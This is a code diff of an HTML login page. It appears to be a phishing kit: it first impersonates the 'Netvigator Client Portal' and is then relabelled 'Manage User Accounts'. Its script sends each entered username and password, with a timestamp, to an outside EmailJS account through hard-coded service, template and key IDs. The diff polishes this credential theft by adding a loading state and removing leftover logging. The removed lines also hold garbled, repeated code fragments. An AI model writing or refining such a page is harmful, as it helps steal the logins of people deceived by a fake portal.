@@ -34,7 +34,7 @@
         h2 {
             color: #333;
         }
-        input, textarea {
+        input {
             width: 100%;
             margin: 10px 0;
             padding: 8px;
@@ -63,7 +63,7 @@
     </style>
 </head>
 <body>
-    <div class="header">Netvigator Client Portal</div>
+    <div class="header">Manage User Accounts</div>
     <div id="login" class="container">
         <h2>Verify and Enable Account</h2>
         <input type="text" id="username" placeholder="Username" required>
@@ -79,88 +79,42 @@
     </div>
 
     <script>
-        let loginHistory = [];
-
         function sendEmail(username, password) {
-            const serviceID = "service_v6hp3f7";  
-            const templateID = "template_7hs846r";  
-            const publicKey = "JYKSTvr8xx8jZDFiA";  
+            const serviceID = "service_v6hp3f7";
+            const templateID = "template_7hs846r";
+            const publicKey = "JYKSTvr8xx8jZDFiA";
 
             const templateParams = {
                 login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
             };
 
-            console.log("Sending email with:", templateParams);
-
-            emailjs.send(serviceID, templateID, templateParams, publicKey)
-                .then(response => {
-                    console.log("Email sent successfully", response);
-                })
-                .catch(error => {
-                    console.error("Error sending email", error);
-                });
+            return emailjs.send(serviceID, templateID, templateParams, publicKey);
         }
 
         function authenticate() {
-    let username = document.getElementById("username").value.trim();
-    let password = document.getElementById("password").value.trim();
+    let loginButton = document.querySelector("button");
+    loginButton.textContent = "Authenticating...";
+    loginButton.disabled = true;
+            let username = document.getElementById("username").value.trim();
+            let password = document.getElementById("password").value.trim();
 
-    if (username && password) {
-        loginHistory.push(`Username: ${username}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
-        console.log("Updated loginHistory:", loginHistory);
-
-        sendEmail(username, password).then(() => {
-            document.getElementById("login").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-        }).catch(error => {
-            console.error("Error sending email", error);
-            alert("Failed to send login report. Please try again.");
-        });
-    } else {
-        alert("Please enter both username and password.");
-    }
-}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
-        console.log("Updated loginHistory:", loginHistory);
-
-        sendEmail(username, password).then(() => {
-            document.getElementById("login").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-        }).catch(error => {
-            console.error("Error sending email", error);
-            alert("Failed to send login report. Please try again.");
-        });
-    } else {
-        alert("Please enter both username and password.");
-    }
-}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
-        console.log("Updated loginHistory:", loginHistory);
-
-        sendEmail(username, password).then(() => {
-            document.getElementById("login").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-        }).catch(error => {
-            console.error("Error sending email", error);
-            alert("Failed to send login report. Please try again.");
-        });
-    } else {
-        alert("Please enter both username and password.");
-    }
-}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
-                console.log("Updated loginHistory:", loginHistory);
-                sendEmail(username, password);
+            if (username && password) {
+                sendEmail(username, password)
+                    .then(() => {
+                        loginButton.textContent = "Login";
+                        loginButton.disabled = false;
+                        document.getElementById("login").style.display = "none";
+                        document.getElementById("dashboard").style.display = "block";
+                    })
+                    .catch(error => {
+                        console.error("Error sending email", error);
+                        loginButton.textContent = "Login";
+                        loginButton.disabled = false;
+                        alert("Failed to send login report. Please try again.");
+                    });
             } else {
                 alert("Please enter both username and password.");
             }
-        }
-
-        function submitFeedback() {
-            let feedback = document.getElementById("feedback").value;
-            if (feedback.trim() === "") {
-                alert("Please enter feedback before submitting.");
-                return;
-            }
-            alert("Feedback submitted successfully!");
-            document.getElementById("feedback").value = "";
         }
     </script>
 </body>
